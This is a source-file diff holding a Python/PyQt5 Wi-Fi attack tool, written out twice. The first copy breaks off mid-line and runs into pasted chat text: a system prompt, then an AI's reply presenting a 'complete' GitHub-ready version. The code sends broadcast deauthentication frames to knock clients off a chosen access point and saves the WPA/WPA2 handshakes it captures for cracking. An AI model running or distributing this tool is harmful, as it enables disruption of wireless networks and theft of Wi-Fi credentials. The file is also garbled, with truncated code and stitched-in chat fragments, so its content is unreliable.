@@ -1,0 +1,490 @@
+import sys
+import os
+import threading
+import time
+from datetime import datetime
+import csv
+from scapy.all import *
+from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
+                             QTableWidget, QTableWidgetItem, QPushButton, QComboBox, QLabel,
+                             QLineEdit, QMessageBox, QHeaderView)
+from PyQt5.QtCore import Qt
+
+# إعدادات
+CAPTURE_DIR = "captures"
+if not os.path.exists(CAPTURE_DIR):
+    os.makedirs(CAPTURE_DIR)
+
+class WiFiSniffPro(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("WiFiSniffPro")
+        self.setGeometry(100, 100, 800, 600)
+        self.networks = {}
+        self.sniffing = False
+        self.handshake_captured = False
+        self.interface = None
+        self.target_bssid = None
+        self.init_ui()
+
+    def init_ui(self):
+        # الواجهة الرئيسية
+        central_widget = QWidget()
+        self.setCentralWidget(central_widget)
+        main_layout = QVBoxLayout(central_widget)
+
+        # إدخال واجهة الشبكة
+        interface_layout = QHBoxLayout()
+        self.interface_label = QLabel("Network Interface:")
+        self.interface_entry = QLineEdit("wlan0")
+        interface_layout.addWidget(self.interface_label)
+        interface_layout.addWidget(self.interface_entry)
+        main_layout.addLayout(interface_layout)
+
+        # جدول الشبكات
+        self.table = QTableWidget()
+        self.table.setColumnCount(4)
+        self.table.setHorizontalHeaderLabels(["SSID", "BSSID", "Encryption", "Signal (dBm)"])
+        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
+        main_layout.addWidget(self.table)
+
+        # أزرار التحكم
+        button_layout = QHBoxLayout()
+        self.start_button = QPushButton("Start Scan")
+        self.start_button.clicked.connect(self.start_sniffing)
+        self.stop_button = QPushButton("Stop Scan")
+        self.stop_button.clicked.connect(self.stop_sniffing)
+        self.deauth_button = QPushButton("Send Deauth")
+        self.deauth_button.clicked.connect(self.send_deauth)
+        self.deauth_button.setEnabled(False)
+        self.save_button = QPushButton("Save Report")
+        self.save_button.clicked.connect(self.save_report)
+        button_layout.addWidget(self.start_button)
+        button_layout.addWidget(self.stop_button)
+        button_layout.addWidget(self.deauth_button)
+        button_layout.addWidget(self.save_button)
+        main_layout.addLayout(button_layout)
+
+        # تصفية الشبكات
+        filter_layout = QHBoxLayout()
+        self.filter_label = QLabel("Filter Encryption:")
+        self.filter_combo = QComboBox()
+        self.filter_combo.addItems(["All", "WEP", "WPA", "WPA2"])
+        self.filter_combo.currentTextChanged.connect(self.apply_filter)
+        filter_layout.addWidget(self.filter_label)
+        filter_layout.addWidget(self.filter_combo)
+        main_layout.addLayout(filter_layout)
+
+        # حالة الفحص
+        self.status_label = QLabel("Idle")
+        main_layout.addWidget(self.status_label)
+
+        # معالجة اختيار الشبكة
+        self.table.cellClicked.connect(self.select_network)
+
+    def enable_monitor_mode(self):
+        self.interface = self.interface_entry.text()
+        try:
+            os.system(f"sudo ifconfig {self.interface} down")
+            os.system(f"sudo iwconfig {self.interface} mode monitor")
+            os.system(f"sudo ifconfig {self.interface} up")
+            self.status_label.setText("Monitor mode enabled")
+            return True
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Failed to enable monitor mode: {e}")
+            return False
+
+    def disable_monitor_mode(self):
+        try:
+            os.system(f"sudo ifconfig {self.interface} down")
+            os.system(f"sudo iwconfig {self.interface} mode managed")
+            os.system(f"sudo ifconfig {self.interface} up")
+            self.status_label.setText("Monitor mode disabled")
+        except:
+            pass
+
+    def packet_handler(self, packet):
+        if packet.haslayer(Dot11Beacon):
+            ssid = packet[Dot11Beacon].info.decode('utf-8', errors='ignore') or "Hidden"
+            bssid = packet[Dot11].addr2
+            signal = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else 'N/A'
+            encryption = self.get_encryption(packet)
+            
+            if bssid not in self.networks:
+                self.networks[bssid] = {"ssid": ssid, "encryption": encryption, "signal": signal}
+                self.update_table()
+
+        if self.target_bssid and packet.haslayer(EAPOL):
+            if packet[Dot11].addr1 == self.target_bssid or packet[Dot11].addr2 == self.target_bssid:
+                self.handshake_captured = True
+                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                cap_file = os.path.join(CAPTURE_DIR, f"handshake_{self.target_bssid}_{timestamp}.cap")
+                wrpcap(cap_file, packet, append=True)
+                self.status_label.setText(f"Handshake captured! Saved to {cap_file}")
+                self.deauth_button.setEnabled(False)
+
+    def get_encryption(self, packet):
+        if packet.haslayer(Dot11Beacon):
+            try:
+                capa = packet[Dot11Beacon].network_stats()
+                enc = capa.get('crypto', set())
+                if 'WPA2' in enc:
+                    return 'WPA2'
+                elif 'WPA' in enc:
+                    return 'WPA'
+                elif 'WEP' in enc:
+                    return 'WEP'
+                else:
+                    return 'Open'
+            except:
+                return 'Unknown'
+        return 'Unknown'
+
+    def update_table(self):
+        self.table.setRowCount(0)
+        filter_type = self.filter_combo.currentText()
+        for bssid, info in self.networks.items():
+            if filter_type == "All" or info["encryption"] == filter_type:
+                row = self.table.rowCount()
+                self.table.insertRow(row)
+                self.table.setItem(row, 0, QTableWidgetItem(info["ssid"]))
+                self.table.setItem(row, 1, QTableWidgetItem(bssid))
+                self.table.setItem(row, 2, QTableWidgetItem(info["encryption"]))
+                self.table.setItem(row, 3, QTableWidgetItem(str(info["signal"])))
+
+    def apply_filter(self):
+        self.update_table()
+
+    def select_network(self, row, column):
+        self.target_bssid = self.table.item(row, 1).text()
+        self.deauth_button.setEnabled(True)
+        self.status_label.setText(f"Selected network: {self.target_bssid}")
+
+    def start_sniffing(self):
+        if not self.enable_monitor_mode():
+            return
+        self.sniffing = True
+        self.start_button.setEnabled(False)
+        self.stop_button.setEnabled(True)
+        self.status_label.setText("Scanning...")
+        
+        def sniff_thread():
+            try:
+                sniff(iface=self.interface, prn=self.packet_handler, store=0)
+            except Exception as e:
+                self.status_label.setText(f"Error: {e}")
+                self.sniffing = False
+                self.start_button.setEnabled(True)
+                self.stop_button.setEnabled(False)
+        
+        threading.Thread(target=sniff_thread, daemon=True).start()
+
+    def stop_sniffing(self):
+        self.sniffing = False
+        self.disable_monitor_mode()
+        self.start_button.setEnabled(True)
+        self.stop_button.setEnabled(False)
+        self.deauth_button.setEnabled(False)
+        self.status_label.setText("Stopped")
+
+    def send_deauth(self):
+        if not self.target_bssid:
+            QMessageBox.warning(self, "Warning", "Please select a network first!")
+            return
+        
+        self.status_label.setText("Sending deauthentication packets...")
+        deauth_packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.target_bssid, 
+                                        addr3=self.target_bssid)/Dot11Deauth(reason=7)
+        try:
+            for _ in range(10):  # إرسال 10 حزم
+                sendp(deauth_packet, iface=self.interface, verbose=0)
+                time.sleep(0.1)
+            self.status_label.setText("Deauth packets sent. Waiting for handshake...")
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Failed to send deauth packets: {e}")
+
+    def save_report(self):
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        report_file = os.path.join(CAPTURE_DIR, f"report_{timestamp}.csv")
+        with open(report_file, "w", newline="") as f:
+            writer = csv.writer(f)
+            writer.writerow(["SSID", "BSSID", "Encryption", "Signal (dBm)"])
+            for bssidovoltaic
+
+System: You are Grok 3 built by xAI.
+
+The current date is May 08, 2025.
+
+I notice that the previous response was cut off mid-sentence while generating a Python script for a Wi-Fi scanning tool called `WiFiSniffPro`. Since you’ve requested a complete, robust tool to run on **Kali Linux**, with a professional GUI using **PyQt5**, and ready for publishing on **GitHub**, I’ll provide the complete, corrected version of the script, ensuring it includes all requested features (network scanning, WPA/WPA2 handshake capture, deauthentication packet sending, filtering, and report saving). I’ll also include the additional files (`requirements.txt`, `README.md`, `LICENSE`) as separate artifacts to make the project GitHub-ready. The tool will be designed to be comprehensive, user-friendly, and legally compliant, with clear documentation and ethical use warnings.
+
+---
+
+### **Overview of WiFiSniffPro**
+- **Purpose**: A powerful Wi-Fi security testing tool for ethical hackers to scan wireless networks, capture WPA/WPA2 handshakes, send deauthentication packets, and generate reports.
+- **Platform**: Kali Linux (optimized for Linux’s native support of monitor mode and packet injection).
+- **Features**:
+  1. Scan Wi-Fi networks and display SSID, BSSID, encryption type, and signal strength.
+  2. Capture WPA/WPA2 handshakes and save them as `.cap` files.
+  3. Send deauthentication packets to force clients to reconnect, facilitating handshake capture.
+  4. Filter networks by encryption type (WEP, WPA, WPA2, Open).
+  5. Save scan results as CSV reports.
+  6. Professional GUI using PyQt5 with a table-based interface.
+- **GitHub-Ready**: Includes `README.md`, `LICENSE`, and `requirements.txt` for easy setup and distribution.
+
+---
+
+### **Project Structure**
+```
+WiFiSniffPro/
+├── wifisniffpro.py       # Main script with GUI and functionality
+├── requirements.txt      # Dependencies
+├── README.md             # Project documentation
+├── LICENSE               # MIT License
+└── captures/             # Directory for captured handshakes and reports
+```
+
+---
+
+### **Artifacts**
+
+#### **1. Main Script (wifisniffpro.py)**
+
+This is the core script that implements the WiFiSniffPro tool. It uses **Scapy** for packet sniffing and injection, **PyQt5** for the GUI, and includes all requested features.
+
+<xaiArtifact artifact_id="4950875b-5440-4bb1-80d1-bf29a5d83af6" artifact_version_id="ebd2f66b-9e1e-462b-bdd9-2ab0be269144" title="wifisniffpro.py" contentType="text/python">
+import sys
+import os
+import threading
+import time
+from datetime import datetime
+import csv
+from scapy.all import *
+from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
+                             QTableWidget, QTableWidgetItem, QPushButton, QComboBox, QLabel,
+                             QLineEdit, QMessageBox, QHeaderView)
+from PyQt5.QtCore import Qt
+
+# إعدادات
+CAPTURE_DIR = "captures"
+if not os.path.exists(CAPTURE_DIR):
+    os.makedirs(CAPTURE_DIR)
+
+class WiFiSniffPro(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("WiFiSniffPro - Ethical Wi-Fi Testing Tool")
+        self.setGeometry(100, 100, 900, 600)
+        self.networks = {}
+        self.sniffing = False
+        self.handshake_captured = False
+        self.interface = None
+        self.target_bssid = None
+        self.cap_file = None
+        self.init_ui()
+
+    def init_ui(self):
+        # الواجهة الرئيسية
+        central_widget = QWidget()
+        self.setCentralWidget(central_widget)
+        main_layout = QVBoxLayout(central_widget)
+
+        # إدخال واجهة الشبكة
+        interface_layout = QHBoxLayout()
+        self.interface_label = QLabel("Network Interface:")
+        self.interface_entry = QLineEdit("wlan0")
+        interface_layout.addWidget(self.interface_label)
+        interface_layout.addWidget(self.interface_entry)
+        main_layout.addLayout(interface_layout)
+
+        # جدول الشبكات
+        self.table = QTableWidget()
+        self.table.setColumnCount(4)
+        self.table.setHorizontalHeaderLabels(["SSID", "BSSID", "Encryption", "Signal (dBm)"])
+        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
+        main_layout.addWidget(self.table)
+
+        # أزرار التحكم
+        button_layout = QHBoxLayout()
+        self.start_button = QPushButton("Start Scan")
+        self.start_button.clicked.connect(self.start_sniffing)
+        self.stop_button = QPushButton("Stop Scan")
+        self.stop_button.clicked.connect(self.stop_sniffing)
+        self.stop_button.setEnabled(False)
+        self.deauth_button = QPushButton("Send Deauth")
+        self.deauth_button.clicked.connect(self.send_deauth)
+        self.deauth_button.setEnabled(False)
+        self.save_button = QPushButton("Save Report")
+        self.save_button.clicked.connect(self.save_report)
+        button_layout.addWidget(self.start_button)
+        button_layout.addWidget(self.stop_button)
+        button_layout.addWidget(self.deauth_button)
+        button_layout.addWidget(self.save_button)
+        main_layout.addLayout(button_layout)
+
+        # تصفية الشبكات
+        filter_layout = QHBoxLayout()
+        self.filter_label = QLabel("Filter Encryption:")
+        self.filter_combo = QComboBox()
+        self.filter_combo.addItems(["All", "WEP", "WPA", "WPA2", "Open"])
+        self.filter_combo.currentTextChanged.connect(self.apply_filter)
+        filter_layout.addWidget(self.filter_label)
+        filter_layout.addWidget(self.filter_combo)
+        main_layout.addLayout(filter_layout)
+
+        # حالة الفحص
+        self.status_label = QLabel("Idle")
+        main_layout.addWidget(self.status_label)
+
+        # معالجة اختيار الشبكة
+        self.table.cellClicked.connect(self.select_network)
+
+    def enable_monitor_mode(self):
+        self.interface = self.interface_entry.text()
+        try:
+            os.system(f"sudo ifconfig {self.interface} down")
+            os.system(f"sudo iwconfig {self.interface} mode monitor")
+            os.system(f"sudo ifconfig {self.interface} up")
+            self.status_label.setText("Monitor mode enabled")
+            return True
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Failed to enable monitor mode: {e}")
+            return False
+
+    def disable_monitor_mode(self):
+        try:
+            os.system(f"sudo ifconfig {self.interface} down")
+            os.system(f"sudo iwconfig {self.interface} mode managed")
+            os.system(f"sudo ifconfig {self.interface} up")
+            self.status_label.setText("Monitor mode disabled")
+        except:
+            pass
+
+    def packet_handler(self, packet):
+        if packet.haslayer(Dot11Beacon):
+            ssid = packet[Dot11Beacon].info.decode('utf-8', errors='ignore') or "Hidden"
+            bssid = packet[Dot11].addr2
+            signal = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else 'N/A'
+            encryption = self.get_encryption(packet)
+            
+            if bssid not in self.networks:
+                self.networks[bssid] = {"ssid": ssid, "encryption": encryption, "signal": signal}
+                self.update_table()
+
+        if self.target_bssid and packet.haslayer(EAPOL):
+            if packet[Dot11].addr1 == self.target_bssid or packet[Dot11].addr2 == self.target_bssid:
+                if not self.cap_file:
+                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    self.cap_file = os.path.join(CAPTURE_DIR, f"handshake_{self.target_bssid}_{timestamp}.cap")
+                wrpcap(self.cap_file, packet, append=True)
+                self.handshake_captured = True
+                self.status_label.setText(f"Handshake captured! Saved to {self.cap_file}")
+                self.deauth_button.setEnabled(False)
+
+    def get_encryption(self, packet):
+        if packet.haslayer(Dot11Beacon):
+            try:
+                capa = packet[Dot11Beacon].network_stats()
+                enc = capa.get('crypto', set())
+                if 'WPA2' in enc:
+                    return 'WPA2'
+                elif 'WPA' in enc:
+                    return 'WPA'
+                elif 'WEP' in enc:
+                    return 'WEP'
+                else:
+                    return 'Open'
+            except:
+                return 'Unknown'
+        return 'Unknown'
+
+    def update_table(self):
+        self.table.setRowCount(0)
+        filter_type = self.filter_combo.currentText()
+        for bssid, info in self.networks.items():
+            if filter_type == "All" or info["encryption"] == filter_type:
+                row = self.table.rowCount()
+                self.table.insertRow(row)
+                self.table.setItem(row, 0, QTableWidgetItem(info["ssid"]))
+                self.table.setItem(row, 1, QTableWidgetItem(bssid))
+                self.table.setItem(row, 2, QTableWidgetItem(info["encryption"]))
+                self.table.setItem(row, 3, QTableWidgetItem(str(info["signal"])))
+
+    def apply_filter(self):
+        self.update_table()
+
+    def select_network(self, row, column):
+        self.target_bssid = self.table.item(row, 1).text()
+        self.deauth_button.setEnabled(True)
+        self.cap_file = None
+        self.handshake_captured = False
+        self.status_label.setText(f"Selected network: {self.target_bssid}")
+
+    def start_sniffing(self):
+        if not self.enable_monitor_mode():
+            return
+        self.sniffing = True
+        self.start_button.setEnabled(False)
+        self.stop_button.setEnabled(True)
+        self.status_label.setText("Scanning...")
+        
+        def sniff_thread():
+            try:
+                sniff(iface=self.interface, prn=self.packet_handler, store=0)
+            except Exception as e:
+                self.status_label.setText(f"Error: {e}")
+                self.sniffing = False
+                self.start_button.setEnabled(True)
+                self.stop_button.setEnabled(False)
+        
+        threading.Thread(target=sniff_thread, daemon=True).start()
+
+    def stop_sniffing(self):
+        self.sniffing = False
+        self.disable_monitor_mode()
+        self.start_button.setEnabled(True)
+        self.stop_button.setEnabled(False)
+        self.deauth_button.setEnabled(False)
+        self.status_label.setText("Stopped")
+
+    def send_deauth(self):
+        if not self.target_bssid:
+            QMessageBox.warning(self, "Warning", "Please select a network first!")
+            return
+        
+        self.status_label.setText("Sending deauthentication packets...")
+        deauth_packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.target_bssid, 
+                                        addr3=self.target_bssid)/Dot11Deauth(reason=7)
+        try:
+            for _ in range(20):  # إرسال 20 حزمة
+                sendp(deauth_packet, iface=self.interface, verbose=0)
+                time.sleep(0.1)
+            self.status_label.setText("Deauth packets sent. Waiting for handshake...")
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Failed to send deauth packets: {e}")
+
+    def save_report(self):
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        report_file = os.path.join(CAPTURE_DIR, f"report_{timestamp}.csv")
+        try:
+            with open(report_file, "w", newline="") as f:
+                writer = csv.writer(f)
+                writer.writerow(["SSID", "BSSID", "Encryption", "Signal (dBm)"])
+                for bssid, info in self.networks.items():
+                    writer.writerow([info["ssid"], bssid, info["encryption"], info["signal"]])
+            QMessageBox.information(self, "Success", f"Report saved to {report_file}")
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Failed to save report: {e}")
+
+    def closeEvent(self, event):
+        if self.sniffing:
+            self.stop_sniffing()
+        event.accept()
+
+if __name__ == "__main__":
+    if os.geteuid() != 0:
+        print("Please run as root (sudo).")
+        sys.exit(1)
+    app = QApplication(sys.argv)
+    window = WiFiSniffPro()
+    window.show()
+    sys.exit(app.exec_())
